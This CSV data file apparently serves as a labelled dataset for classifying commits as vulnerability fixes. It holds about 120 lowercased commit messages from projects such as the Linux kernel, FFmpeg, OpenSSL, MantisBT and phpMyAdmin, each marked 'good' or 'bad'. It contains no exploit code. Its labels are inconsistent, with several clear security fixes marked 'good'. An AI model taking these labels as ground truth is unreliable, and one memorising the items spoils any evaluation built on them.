"";"index";"all_text";"vuln"
"1010";"1831";"update link handling";"bad"
"1011";"7022";"cifs fix use after free in smb2_write there is a kasan use after free bug kasan use after free in smb2_write 0x1342 0x1580 read of size 8 at addr ffff8880b6a8e450 by task ln 4196 should not release the req because it will use in the trace fix eccb4422cf97 smb3 add ftrace tracepoints for improved smb3 debugging signed off by zhangxiaoxu zhangxiaoxu5 huawei com signed off by steve french stfrench microsoft com cc stable stable vger kernel org 4 18 reviewed by pavel shilovsky pshilov microsoft com";"good"
"1012";"12358";"2 11 10 release";"good"
"1013";"8886";"merged with github";"good"
"1014";"9665";"update configure script";"good"
"1015";"6352";"avoid csrf in user csv import";"bad"
"1016";"879";"jpcert cc 脆弱性情報ハンドリングチームより zen cartにおけるクロスサイトスクリプティングの脆弱性があるとのことで 1 5 3 1 5 4からソースを持ってきて変更し 対応しました signed off by kimono maeda obitastar co jp";"bad"
"1017";"12686";"fixed 6273 file inclusion vulnerability git svn id http mantisbt svn sourceforge net svnroot mantisbt trunk 3847 f5dc347c c33d 0410 90a0 b07cc1902cb9";"good"
"1018";"1937";"avcodec vc1_block fix mqaunt check for negative value fix out of array access fix ffmpeg_bof_4 avi fix ffmpeg_bof_5 avi fix ffmpeg_bof_6 avi found by thuan pham marcel böhme andrew santosa and alexandru razvan caciulescu with aflsmart reviewed by jerome borsboom jerome borsboom carpalis nl signed off by michael niedermayer michael niedermayer cc";"bad"
"1019";"1460";"fix security vulnerability allowing command line exploit when using exim or sendmail from the command line";"bad"
"1020";"2392";"don t lower laststreamid_ summary this could throw off the logic about what is header trailer cve 2018 6347 reviewed by avasylev bolekk differential revision d13521704 fbshipit source id ed436ff13f191bf04764494973fcb73b35ed1256";"bad"
"1021";"3343";"tool tiffcp c fix read of undefined variable in case of missing required tag found on test case of msvr 35100 tool tiffcrop c fix read of undefined buffer in readcontigstripsintobuffer due to uint16 overflow probably not a security issue but i can be wrong reported a msvr 35100 by axel souchet from the msrc vulnerability mitigation team";"bad"
"1022";"9368";"merge pull request 714 from finetjul support extended path in permissive_name_w do not preppend if it is already there";"good"
"1023";"7517";"fix two iakerb comment the comment explaining why there is no iakerb_gss_import_sec_context erroneously referenced spnego instead of iakerb noticed by ben kaduk the comment above iakerb_gss_delete_sec_context is out of date after the last commit";"good"
"1024";"914";"fix length check in x509_cmp_time to avoid out of bound read also tighten x509_cmp_time to reject more than three fractional second in the time and to reject trailing garbage after the offset cve 2015 1789 reviewed by viktor dukhovni viktor openssl org reviewed by richard levitte levitte openssl org";"bad"
"1025";"9073";"added tl validation check for dh key added further agreement result check";"good"
"1026";"11865";"merge remote tracking branch origin qa_4_2 into qa_4_2";"good"
"1027";"6491";"fix preventing x injection and uniform code";"bad"
"1028";"12156";"ozw better handling of instance index internally user code and alarm class need more work";"good"
"1029";"11808";"release djblets 0 7 30";"good"
"1030";"5795";"fix 249 csrf to create table query signed off by madhura jayaratne madhura cj gmail com";"bad"
"1031";"10702";"move the setting to the agent interface allowing multiple process to share the config fix a bug in the screen share code for non gpu that wa leaking memory improve the non gpu screen share by actually using the found change fix the possible bug causing laptop with multiple adapter to fail";"good"
"1032";"2258";"pkg tool improve sanitizepath 5558";"bad"
"1033";"9459";"merge tag kvm arm for 4 8 of git git kernel org pub scm linux kernel git kvmarm kvmarm into next kvm arm change for linux 4 8 gicv3 it emulation simpler idmap management that fix potential tlb conflict honor the kernel protection in hyp mode removal of the old vgic implementation";"good"
"1034";"9335";"usb fix regression in superspeed endpoint descriptor parsing commit b37d83a6a414 usb parse the new usb 3 1 superspeedplus isoc endpoint companion descriptor caused a regression in 4 6 rc1 and fails to parse superspeed endpoint companion descriptor the new superspeedplus isoc endpoint companion parsing code incorrectly decreased the the remaining buffer size before comparing the size with the expected length of the descriptor this lead to possible failure in reading the superspeed endpoint companion descriptor of the last endpoint displaying a message like no superspeed endpoint companion for config 1 interface 0 altsetting 0 ep 129 using minimum value fix it by decreasing the size after comparing it also finish all the s endpoint companion parsing before calling ssp isoc endpoint parsing function fix b37d83a6a414 signed off by mathias nyman mathias nyman linux intel com signed off by greg kroah hartman gregkh linuxfoundation org";"good"
"1035";"11405";"correction to popupnews controller";"good"
"1036";"5571";"fix sql injection in manage_user_page php this vulnerability cve 2014 9573 wa reported by high tech bridge security research lab http www htbridge com in issue 17937 advisory id htb23243 to avoid injection the parameter we get from the cookie are now properly sanitized before being used in the sql query fix 17940";"bad"
"1037";"2635";"fix bug 73737 fpe when parsing a tag format";"bad"
"1038";"6124";"fix sql injection vulnerability in adm_config_report php jakub galczyk hauntit blog http hauntit blogspot com reported this issue introduced by f8a81a33880752364ea47bdd9a987bff986c81de in mantisbt 1 2 13 root cause is the use of unsanitized inlined query parameter fix 17055";"bad"
"1039";"1144";"net http harden server against request smuggling see rfc 7230 thanks to régis leroy for the report change id ic1779bc2180900430d4d7a4938cac04ed73c304c reviewed on http go review googlesource com 11810 reviewed by rus cox rsc golang org run trybot brad fitzpatrick bradfitz golang org";"bad"
"1040";"12918";"smarty3 compat bp entry tpl changed eval to assign";"good"
"1041";"12594";"_source_query_id follow up fix for last commit oops i forgot to use the newly created t_source_query_id variable in commit 3110481c6492ffcb9b3f2f6886897508db4ed1aa we now no longer directly assume t_filter _source_query_id exists and will use the default of 1 if that filter element is undefined";"good"
"1042";"5581";"fixed jenkins 25019 a truly conforming servlet 3 0 container doe not allow u to set secure cookie flag beyond servletcontextlistener oninitialized if we see that don t scare the user";"bad"
"1043";"5371";"bugfix initiate_stratum ensure extranonce2 size is not negative which could lead to exploit later a too little memory get allocated thanks to mick ayzenberg mick dejavusecurity com for finding this";"bad"
"1044";"4984";"fix a few incorrectly checked io_ remap_pfn_range call nico golde report a few straggling us of io_ remap_pfn_range that really should use the vm_iomap_memory helper this trivially convert two of them to the helper and comment about why the third one really need to continue to use remap_pfn_range and add the missing size check reported by nico golde nico ngolde de cc stable kernel org signed off by linus torvalds torvalds linux foundation org";"bad"
"1045";"7956";"merge pull request 63 from simonwelsh patch 4 documentation fix";"good"
"1046";"237";"http github com imagemagick imagemagick issue 1600";"bad"
"1047";"263";"fix do not use the tmp directory http github com linuxdeepin deepin clone issue 16 http bugzilla opensuse org show_bug cgi id 1130388";"bad"
"1048";"5696";"fix to an unescaped id that could be used to inject x into the side menu on some view";"bad"
"1049";"3115";"fix x vulnerability on site name";"bad"
"1050";"190";"merge pull request 2475 from ry0tak v3 0 fix required login bypass vulnerability";"bad"
"1051";"8235";"merge branch for linus of git git linaro org people rmk linux arm pull core arm update from russell king this is the bulk of the core arm update for this merge window included in here is a different way to handle the vivt cache flushing on context switch which should allow scheduler folk to remove a special case in their core code we have architectured timer support here which is a set of timer specified by the arm architecture for future socs so we should see le variability in timer design going forward the last big thing here is my cleanup to the way we handle pci across arm fixing some oddity in some platform which hadn t realised there wa a way to deal with their private data already built in to our pci backend i ve also removed support for the armv3 architecture it hasn t worked properly for year so it seems pointless to keep it around for linus of git git linaro org people rmk linux arm 47 commits arm pci remove per pci_hw list of bus arm pci dove kirkwood mv78xx0 use sys private_data arm pci provide a default bus scan implementation arm pci get rid of pci_std_swizzle arm pci versatile fix pci interrupt setup arm pci integrator use common pci swizzle arm 7416 1 lpae remove unused l_pte_ bufferable cacheable macro arm 7415 1 vfp convert printk s to pr_ s arm decompressor avoid speculative prefetch from non ram area arm remove armv3 support from decompressor arm 7413 1 move read_ boot persistent _clock to the architecture level arm remove support for armv3 arm610 and arm710 cpu arm 7363 1 debug_ll limit early mapping to the minimum arm 7391 1 versatile add some auxdata for device tree arm 7389 2 plat versatile modernize fpga irq controller amba get rid of last two us of no_irq arm 7408 1 cacheflush return error to userspace when flushing syscall fails arm 7409 1 do not call flush_cache_user_range with mmap_sem held arm 7404 1 cmpxchg64 use atomic64 and local64 routine for cmpxchg64 arm 7347 1 scu use cpu_logical_map for per cpu low power mode";"good"
"1052";"7969";"doc update improved g_bug_link_tag added g_bugnote_link_tag";"good"
"1053";"6923";"interface may not have an ip address yet signed off by joachim nilsson troglobit gmail com";"good"
"1054";"6332";"ticket 6486 cross site scripting on login page";"bad"
"1055";"12851";"package lock updated with 19 10 npm repo 7881 package lock updated with 19 10 npm repo package updated update package version package lock";"good"
"1056";"7823";"merge pull request 123 from coolaj86 patch 1 fix node j security vulnerability test for require directly";"good"
"1057";"10689";"php 7 1 11";"good"
"1058";"1506";"udf avoid run away loop when partition table length is corrupted check provided length of partition table so that possibly maliciously corrupted partition table cannot cause accessing data beyond current buffer signed off by jan kara jack suse cz";"bad"
"1059";"8033";"merge pull request 54 from rmm5t fix_gemspec_warning add a more detailed description to the gemspec";"good"
"1060";"5670";"chg response header added x x protection header a reported by an external pentest company on behalf of the centre for cyber security belgium ccb";"bad"
"1061";"8864";"security sanitize path host before parsing";"good"
"1062";"13030";"fix h1 report 98612 information exposure through discrepancy karan m tank and smit b shah have reported via hackerone that it wa possible to check whether or not an email address wa associated to one or more user account on a target revive adserver instance by examining the message printed by the password recovery system such information cannot however be used directly to log in to the system which requires usernames instead a cve id ha been requested but not assigned yet cwe cwe 203 cvssv2 5 av n ac l au n c p i n a n";"good"
"1063";"479";"asset do not allow filename longer than 255 character";"bad"
"1064";"12240";"translated using weblate french currently translated at 100 0 3307 of 3307 string ci skip translation phpmyadmin 4 9 translate url http hosted weblate org project phpmyadmin 4 9 fr signed off by olivier humbert trebmuh tuxfamily org";"good"
"1065";"10397";"cve 2017 13003 clean up the lmp dissector do a lot more bound and length check add a extract_8bits macro for completeness and so a not to confuse people into thinking that to fetch a 1 byte value from a packet they need to use extract_16bits to fetch a 2 byte value and then use shifting and masking to extract the desired byte use that rather than using extract_16bits to fetch a 2 byte value and then shifting and masking to extract the desired byte don t treat ipv4 address and unnumbered interface id the same the first should be printed a an ipv4 address but the latter should just be printed a number handle ipv6 address in more object type while we re at it this fix a buffer over read discovered by forcepoint s security researcher otto airamo antti levomäki add a test using the capture file supplied by the reporter s";"good"
"1066";"9255";"move databse check to correct location signed off by michal čihař michal cihar com";"good"
"1067";"11209";"alsa hda realtek change the location for one of two front microphone on this lenovo machine there are two front mics and both of them are assigned the same name mic but pulseaudio can t support two mics with the same name a a workaround we change the location for one of them then the driver will assign front mic and mic for them cc stable vger kernel org signed off by hui wang hui wang canonical com signed off by takashi iwai tiwai suse de";"good"
"1068";"9667";"bump version to 6 9 3 8";"good"
"1069";"9514";"skip test which is 64bits only diff from test output 001 warning fread length parameter must be greater than 0 in 001 warning fread length parameter must be no more than 2147483647 in";"good"
"1070";"6113";"fix x in bug_change_status_page php the value of the change_type parameter wa not encoded before being displayed a a hidden input this vulnerability wa reported by etienne landais fix 22486";"bad"
"1071";"1671";"bluetooth hci fix info leak in getsockopt hci_filter the hci code fails to initialize the two padding byte of struct hci_ufilter before copying it to userland that for leaking two byte kernel stack add an explicit memset 0 before filling the structure to avoid the info leak signed off by mathias krause minipli googlemail com cc marcel holtmann marcel holtmann org cc gustavo padovan gustavo padovan org cc johan hedberg johan hedberg gmail com signed off by david s miller davem davemloft net";"bad"
"1072";"9372";"merge pull request 195 from seezer qt5sessions support session management with qt5";"good"
"1073";"600";"board factor out tiny_dispatch and add stronger check on what tiny_msg s are allowed to be decoded";"bad"
"1074";"6015";"fixed issue 9720 sql injection vulnerability in data entry";"bad"
"1075";"5122";"issue 102 piping null to the server will crash it";"bad"
"1076";"4368";"bn asm x86_64 mont5 pl fix carry bug in bn_sqrx8x_internal credit to os fuzz for finding this cve 2017 3736 reviewed by rich salz rsalz openssl org";"bad"
"1077";"11679";"localisation update from http translatewiki net";"good"
"1078";"1019";"move nfs c foreach_nfs_shareopt to libshare c foreach_shareopt so that it can be re used in other part of libshare";"bad"
"1079";"8408";"fix strncat cpy bounding issue fix 1425";"good"
"1080";"6353";"avoid x in pagination ordering";"bad"
"1081";"12072";"replace by in filename of attachment fix 2537";"good"
"1082";"7076";"cve 2019 16768 internal exception message exposure in login action";"good"
"1083";"5801";"merge pull request 12711 from devenbansod fix_12361 fix 12361 fix self sql injection in table specific privilege";"bad"
"1084";"9991";"merge branch master of http github com ultimatemember ultimatemember into development metatable";"good"
"1085";"8159";"load json rather than javascript from phpmyadmin net conflict j function j library header class php";"good"
"1086";"4794";"merge remote tracking branch holman fix user edit injection into v4 1";"bad"
"1087";"169";"fixing hpack header table resize issue summary on resizing the header table down and then up again a resize can be called against the underlying vector that actually size it down this cause a lot of thing to break a the code that doe the resizing assumes the underlying vector is only ever resized up reviewed by afrind differential revision d4613681 fbshipit source id 35b61cab53d5bc097424d6c779f90b7fdea42002";"bad"
"1088";"6725";"fixed 4090 ecommerce on es6 filter based on number return error";"good"
"1089";"4897";"vm add vm_iomap_memory helper function various driver end up replicating the code to mmap their memory buffer into user space and our core memory remapping function may be very flexible but it is unnecessarily complicated for the common case to use our internal vm us pfn s page frame number which simplifies thing for the vm and allows u to pas physical address around in a denser and more efficient format than passing a phys_addr_t around and having to shift it up and down by the page size but it just mean that driver end up doing that shifting instead at the interface level it also mean that driver end up mucking around with internal vm thing like the vma detail vm_pgoff vm_start end way more than they really need to so this just export a function to map a certain physical memory range into user space using a phys_addr_t based interface that is much more natural for a driver and hide all the complexity from the driver some driver will still end up tweaking the vm_page_prot detail for thing like prefetching or cacheability etc but that s actually relevant to the driver rather than caring about what the page offset of the mapping is into the particular io memory region acked by greg kroah hartman gregkh linuxfoundation org signed off by linus torvalds torvalds linux foundation org";"bad"
"1090";"4360";"fix security issue ref 4 update version to 1 0 5 update to use yaml safe_load update to tomoh1r";"bad"
"1091";"7999";"updated mac build process";"good"
"1092";"4170";"disallow creation of empty file in read only mode reported by michal zalewski feedback ok deraadt";"bad"
"1093";"5145";"fuse verify ioctl retries verify that the total length of the iovec returned in fuse_ioctl_retry doesn t overflow iov_length signed off by miklos szeredi mszeredi suse cz cc tejun heo tj kernel org cc stable kernel org 2 6 31";"bad"
"1094";"3829";"resolving issue 877 improving resolution to 847 and one additional vulnerability";"bad"
"1095";"5129";"randomise multipart boundary thanks to yamada masahiro";"bad"
"1096";"6824";"avcodec dxtory check slice_size against minimum in dxtory_decode_v2 fix timeout 33sec 16 milli sec fix 14181 clusterfuzz testcase minimized ffmpeg_av_codec_id_dxtory_fuzzer 5681840708386816 found by continuous fuzzing process http github com google os fuzz tree master project ffmpeg signed off by michael niedermayer michael niedermayer cc";"good"
"1097";"4133";"http github com imagemagick imagemagick issue 592";"bad"
"1098";"12843";"updation doe not update form_id";"good"
"1099";"10892";"net ipv4 fix table id in getroute response rtm_table is an 8 bit field while table id are allowed up to u32 commit 709772e6e065 net fix routing table with id 255 for legacy software added the preference to set rtm_table in dump to rt_table_compat if the table id is 255 the table id returned on get route request should do the same fix c36ba6603a11 net allow user to get table id from route lookup signed off by david ahern dsa cumulusnetworks com signed off by david s miller davem davemloft net";"good"
"1100";"2657";"l2tp fix racy sock_zapped flag check in l2tp_ip 6 _bind lock socket before checking the sock_zapped flag in l2tp_ip6_bind without lock a concurrent call could modify the socket flag between the sock_flag sk sock_zapped test and the lock_sock call this way a socket could be inserted twice in l2tp_ip6_bind_table releasing it would then leave a stale pointer there generating use after free error when walking through the list or modifying adjacent entry bug kasan use after free in l2tp_ip6_close 0x22e 0x290 at addr ffff8800081b0ed8 write of size 8 by task syz executor 10987 cpu 0 pid 10987 comm syz executor not tainted 4 8 0 39 hardware name qemu standard pc i440fx piix 1996 bios rel 1 8 2 0 g33fbe13 by qemu project org 04 01 2014 ffff880031d97838 ffffffff829f835b ffff88001b5a1640 ffff8800081b0ec0 ffff8800081b15a0 ffff8800081b6d20 ffff880031d97860 ffffffff8174d3cc ffff880031d978f0 ffff8800081b0e80 ffff88001b5a1640 ffff880031d978e0 call trace ffffffff829f835b dump_stack 0xb3 0x118 lib dump_stack c 15 ffffffff8174d3cc kasan_object_err 0x1c 0x70 mm kasan report c 156 inline print_address_description mm kasan report c 194 ffffffff8174d666 kasan_report_error 0x1f6 0x4d0 mm kasan report c 283 inline kasan_report mm kasan report c 303 ffffffff8174db7e __asan_report_store8_noabort 0x3e 0x40 mm kasan report c 329 inline __write_once_size include linux compiler h 249 inline __hlist_del include linux list h 622 inline hlist_del_init include linux list h 637 ffffffff8579047e l2tp_ip6_close 0x22e 0x290 net l2tp l2tp_ip6 c 239 ffffffff850b2dfd inet_release 0xed 0x1c0 net ipv4 af_inet c 415 ffffffff851dc5a0 inet6_release 0x50 0x70 net ipv6 af_inet6 c 422 ffffffff84c4581d sock_release 0x8d 0x1d0 net socket c 570 ffffffff84c45976 sock_close 0x16 0x20 net socket c 1017 ffffffff817a108c __fput 0x28c 0x780 f file_table c 208 ffffffff817a1605 ____fput 0x15 0x20 f file_table c 244 ffffffff813774f9 task_work_run 0xf9 0x170 ffffffff81324aae do_exit 0x85e 0x2a00 ffffffff81326dc8 do_group_exit 0x108 0x330 ffffffff81348cf7 get_signal 0x617 0x17a0 kernel signal c 2307 ffffffff811b49af do_signal 0x7f 0x18f0 ffffffff810039bf exit_to_usermode_loop 0xbf 0x150 arch x86 entry common c 156 inline prepare_exit_to_usermode arch x86 entry common c 190 ffffffff81006060 syscall_return_slowpath 0x1a0 0x1e0 arch x86 entry common c 259 ffffffff85e4d726 entry_syscall_64_fastpath 0xc4 0xc6 object at ffff8800081b0ec0 in cache l2tp ipv6 size 1448 allocated pid 10987 1116 897025 ffffffff811ddcb6 save_stack_trace 0x16 0x20 1116 897025 ffffffff8174c736 save_stack 0x46 0xd0 1116 897025 ffffffff8174c9ad kasan_kmalloc 0xad 0xe0 1116 897025 ffffffff8174cee2 kasan_slab_alloc 0x12 0x20 1116 897025 inline slab_post_alloc_hook mm slab h 417 1116 897025 inline slab_alloc_node mm slub c 2708 1116 897025 inline slab_alloc mm slub c 2716 1116 897025 ffffffff817476a8 kmem_cache_alloc 0xc8 0x2b0 mm slub c 2721 1116 897025 ffffffff84c4f6a9 sk_prot_alloc 0x69 0x2b0 net core sock c 1326 1116 897025 ffffffff84c58ac8 sk_alloc 0x38 0xae0 net core sock c 1388 1116 897025 ffffffff851ddf67 inet6_create 0x2d7 0x1000 net ipv6 af_inet6 c 182 1116 897025 ffffffff84c4af7b __sock_create 0x37b 0x640 net socket c 1153 1116 897025 inline sock_create net socket c 1193 1116 897025 inline sysc_socket net socket c 1223 1116 897025 ffffffff84c4b46f sys_socket 0xef 0x1b0 net socket c 1203 1116 897025 ffffffff85e4d685 entry_syscall_64_fastpath 0x23 0xc6 freed pid 10987 1116 897025 ffffffff811ddcb6 save_stack_trace 0x16 0x20 1116 897025 ffffffff8174c736 save_stack 0x46 0xd0 1116 897025 ffffffff8174cf61 kasan_slab_free 0x71 0xb0 1116 897025 inline slab_free_hook mm slub c 1352 1116 897025 inline slab_free_freelist_hook mm slub c 1374 1116 897025 inline slab_free mm slub c 2951 1116 897025 ffffffff81748b28 kmem_cache_free 0xc8 0x330 mm slub c 2973 1116 897025 inline sk_prot_free net core sock c 1369 1116 897025 ffffffff84c541eb __sk_destruct 0x32b 0x4f0 net core sock c 1444 1116 897025 ffffffff84c5aca4 sk_destruct 0x44 0x80 net core sock c 1452 1116 897025 ffffffff84c5ad33 __sk_free 0x53 0x220 net core sock c 1460 1116 897025 ffffffff84c5af23 sk_free 0x23 0x30 net core sock c 1471 1116 897025 ffffffff84c5cb6c sk_common_release 0x28c 0x3e0 include net sock h 1589 1116 897025 ffffffff8579044e l2tp_ip6_close 0x1fe 0x290 net l2tp l2tp_ip6 c 243 1116 897025 ffffffff850b2dfd inet_release 0xed 0x1c0 net ipv4 af_inet c 415 1116 897025 ffffffff851dc5a0 inet6_release 0x50 0x70 net ipv6 af_inet6 c 422 1116 897025 ffffffff84c4581d sock_release 0x8d 0x1d0 net socket c 570 1116 897025 ffffffff84c45976 sock_close 0x16 0x20 net socket c 1017 1116 897025 ffffffff817a108c __fput 0x28c 0x780 f file_table c 208 1116 897025 ffffffff817a1605 ____fput 0x15 0x20 f file_table c 244 1116 897025 ffffffff813774f9 task_work_run 0xf9 0x170 1116 897025 ffffffff81324aae do_exit 0x85e 0x2a00 1116 897025 ffffffff81326dc8 do_group_exit 0x108 0x330 1116 897025 ffffffff81348cf7 get_signal 0x617 0x17a0 kernel signal c 2307 1116 897025 ffffffff811b49af do_signal 0x7f 0x18f0 1116 897025 ffffffff810039bf exit_to_usermode_loop 0xbf 0x150 arch x86 entry common c 156 1116 897025 inline prepare_exit_to_usermode arch x86 entry common c 190 1116 897025 ffffffff81006060 syscall_return_slowpath 0x1a0 0x1e0 arch x86 entry common c 259 1116 897025 ffffffff85e4d726 entry_syscall_64_fastpath 0xc4 0xc6 memory state around the buggy address ffff8800081b0d80 fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc ffff8800081b0e00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc ffff8800081b0e80 fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb ffff8800081b0f00 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ffff8800081b0f80 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb the same issue exists with l2tp_ip_bind and l2tp_ip_bind_table fix c51ce49735c1 l2tp fix oops in l2tp ip socket for connect af_unspec case reported by baozeng ding sploving1 gmail com reported by andrey konovalov andreyknvl google com tested by baozeng ding sploving1 gmail com signed off by guillaume nault g nault alphalink fr signed off by david s miller davem davemloft net";"bad"
"1101";"2895";"unanchored regex would allow badness through this patch eliminates a x identified by jpcert reference number jvn 58455472";"bad"
"1102";"7775";"disable confirm to quit when downloading the playlist";"good"
"1103";"9680";"remove easypost library v3 1 2 add missing mediaelement j nl locale file update change detailed log";"good"
"1104";"10499";"avformat mxfdec fix do issue in mxf_read_index_entry_array fix 20170829a mxf co author 张洪亮 望初 wangchu zhl alibaba inc com found by xiaohei and wangchu from alibaba security team signed off by michael niedermayer michael niedermayer cc";"good"
"1105";"7685";"merge pull request 4 from matsuu fix kill command path fix kill command path";"good"
"1106";"11635";"cb 6050 use instance method on actual file plugin object to get fileentry to return on download";"good"
"1107";"9336";"usb mct_u232 add sanity checking in probe an attack using the lack of sanity checking in probe is known this patch check for the existence of a second port cve 2016 3136 signed off by oliver neukum oneukum suse com cc stable vger kernel org johan add error message signed off by johan hovold johan kernel org signed off by greg kroah hartman gregkh linuxfoundation org";"good"
"1108";"1054";"mnt update detach_mounts to leave mount connected now that it is possible to lazily unmount an entire mount tree and leave the individual mount connected to each other add a new flag umount_connected to umount_tree to force this behavior and use this flag in detach_mounts this close a bug where the deletion of a file or directory could trigger an unmount and reveal data under a mount point cc stable vger kernel org signed off by eric w biederman ebiederm xmission com";"bad"
"1109";"10134";"security fixed x in inline edit on save action";"good"
"1110";"3288";"stable9 set content type to application octet stream some browser such a firefox on microsoft window otherwise do offer to open the file directly which is kinda silly backport of http github com nextcloud server pull 258";"bad"
"1111";"362";"security html file browser execution window firefox ie this address an issue reported by aishwarya iyer where attached html file are executed in the browser instead of forcing download in firefox and ie for window specifically this is caused by an incorrect content disposition set in the attachmentfile download function instead of attachment having a disposition of attachment which force download they have a disposition of inline which display the file content in the browser this update the download function to use whatever disposition is passed for s3 plugin if none it default to attachment in addition this overwrites the disposition and set it to attachment after the bk sendredirecturl so that s3 attachment still work and the issue of an attacker passing their own disposition is mitigated";"bad"
"1112";"8979";"fixed cve 2018 8786 thanks to eyal itkin from check point software technology";"good"
"1113";"12650";"add csrf protection for bug_monitor";"good"
"1114";"490";"1 0 1 update add t linting include g validation example";"bad"
"1115";"7596";"merge pull request 3 from nthykier free_va_list always free va_list with va_end";"good"
"1116";"9299";"alsa hda fix bass pin fixup for asus n550jx asus n550jx pci ssid 1043 13df requires the same fixup for a bass speaker output pin a other n550 model bugzilla http bugzilla kernel org show_bug cgi id 110001 cc stable vger kernel org signed off by takashi iwai tiwai suse de";"good"
"1117";"124";"bug 700937 limit recursion in regexp matcher also handle negative return code a an error in the j binding";"bad"
"1118";"1950";"bugfix possible security vulnerability in smarty_security class";"bad"
"1119";"11970";"bug 4578 security x vulnerability in table print view signed off by madhura jayaratne madhura cj gmail com";"good"
"1120";"11725";"netfilter nf_conntrack_dccp use s format string for buffer some invocation of nf_log_packet use arg buffer directly instead of s format string with follow up buffer pointer currently these two usage are not really critical but we should fix this up nevertheless so that we don t run into trouble if that change one day signed off by daniel borkmann dborkman redhat com signed off by pablo neira ayuso pablo netfilter org";"good"
"1121";"1818";"clear all cap except the bounding set when user is specified currently we are giving all cap to user when running with podman run user they should get none by default if the command line includes cap add then we need to run with those capabilties similarly we need to drop cap from bounding set if user specifies cap drop signed off by daniel j walsh dwalsh redhat com close 851 approved by mheon";"bad"
"1122";"7297";"sched clean up active_mm reference counting the current active_mm reference counting is confusing and sub optimal rewrite the code to explicitly consider the 4 separate case user user when switching between two user task all we need to consider is switch_mm user kernel when switching from a user task to a kernel task which doesn t have an associated mm we retain the last mm in our active_mm increment a reference count on active_mm kernel kernel when switching between kernel thread all we need to do is pas along the active_mm reference kernel user when switching between a kernel and user task we must switch from the last active_mm to the next mm hoping of course that these are the same decrement a reference on the active_mm the code keep a different order because a you ll note both to user case require switch_mm and where the old code would increment decrement for the kernel kernel case the new code observes this is a neutral operation and avoids touching the reference count signed off by peter zijlstra intel peterz infradead org reviewed by rik van riel riel surriel com reviewed by mathieu desnoyers mathieu desnoyers efficios com cc luto kernel org";"good"
"1123";"6769";"handle trailing slash in httpurlbuilder 1444";"good"
"1124";"678";"bpo 36495 fix two out of bound array read gh 12641 research and fix by bradlarsen";"bad"
"1125";"9633";"sync news";"good"
"1126";"9452";"bacapp event time stamp decode fix event time stamp decode when array index is 0 bug 12422 change id i9f1f90e269352a49a8fc8a2ba2f64211f3cf7961 reviewed on http code wireshark org review 15409 reviewed by michael mann mmann78 netscape net cherry picked from commit de61fb1cfbba8683c93672f38824202da13dad26 reviewed on http code wireshark org review 15412 petri dish michael mann mmann78 netscape net tested by petri dish buildbot buildbot no reply wireshark org";"good"
"1127";"4355";"key remove key_type match in favour of overriding default by match_preparse a previous patch added a match_preparse method to the key type this is allowed to override the function called by the iteration algorithm therefore we can just set a default that simply check for an exact match of the key description with the original criterion data and allow match_preparse to override it a needed the key_type match op is then redundant and can be removed a can the user_match function signed off by david howells dhowells redhat com acked by vivek goyal vgoyal redhat com";"bad"
"1128";"313";"fix allow orderby only for whitelist column";"bad"
"1129";"10202";"update android security bulletin march 2017";"good"
